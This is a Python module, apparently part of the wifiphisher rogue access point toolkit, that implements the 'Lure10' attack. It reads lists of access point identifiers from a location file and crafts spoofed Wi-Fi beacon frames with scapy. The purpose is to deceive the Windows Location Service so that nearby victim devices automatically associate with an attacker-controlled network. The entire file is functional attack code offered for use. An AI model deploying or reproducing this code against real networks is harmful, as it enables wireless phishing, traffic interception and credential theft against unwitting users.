"""
Extension that implements the Lure10 attack.

Exploits the Wi-Fi Sense feature and will result
to automatic association by fooling the Windows
Location Service
"""

import struct
import wifiphisher.common.constants as constants
import scapy.layers.dot11 as dot11


class Lure10(object):
    """
    Sends a number of beacons to fool Windows Location Service.
    """

    def __init__(self, shared_data):
        """
        Setup the class with all the given arguments.

        :param self: A Lure10 object.
        :param data: Shared data from main engine
        :type self: Deauthentication
        :type data: dictionary
        :return: None
        :rtype: None
        """

        self.first = True
        self.first_output = True
        self.data = shared_data
        self.beacons_num = 0

    def get_packet(self, pkt):
        """
        We start broadcasting the beacons on the first received packet.

        :param self: A Lure10 object.
        :param packet: A scapy.layers.RadioTap object.
        :type self: Lure10
        :type packet: scapy.layers.RadioTap
        :return: list with the crafted beacon frames
        :rtype: list
        """

        beacons = []

        if self.first:
            if self.data.args.lure10_exploit:
                area_file = constants.LOCS_DIR + self.data.args.lure10_exploit
                with open(area_file) as a_file:
                    wlans = [x.strip() for x in a_file.readlines()]
                    for wlan in wlans:
                        bssid, essid = wlan.split(' ', 1)
                        # Frequency for channel 7
                        frequency = struct.pack("<h", 2407 + 7 * 5)
                        ap_rates = "\x0c\x12\x18\x24\x30\x48\x60\x6c"
                        frame = dot11.RadioTap(len=18,
                                               present='Flags+Rate+Channel+dBm_AntSignal+Antenna',
                                               notdecoded='\x00\x6c' + \
                                               frequency + '\xc0\x00\xc0\x01\x00\x00') \
                                               / dot11.Dot11(subtype=8, \
                                               addr1='ff:ff:ff:ff:ff:ff', \
                                               addr2=bssid, \
                                               addr3=bssid) / dot11.Dot11Beacon(cap=0x2105) \
                                               / dot11.Dot11Elt(ID='SSID', \
                                               info="") / dot11.Dot11Elt(ID='Rates', \
                                               info=ap_rates) / dot11.Dot11Elt(ID='DSset', \
                                               info=chr(7))
                        beacons.append(frame)
            self.beacons_num = len(beacons)
            self.first = False

        return (["*"], beacons)

    def send_output(self):
        """
        Sending a Lure10 note only on the first time.

        :param self: A Lure10 object.
        :type self: Lure10
        :return: list
        :rtype: list
        """

        if self.data.args.lure10_exploit and self.first_output:

            self.first_output = False

            return ["Lure10 - Sending " +
                    str(self.beacons_num) +
                    " beacons to spoof location service"]

    def send_channels(self):
        """
        Send all interested channels

        :param self: A Lure10 object.
        :type self: Lure10
        :return: A list with all the channels interested.
        :rtype: list
        """

        return [self.data.target_ap_channel]
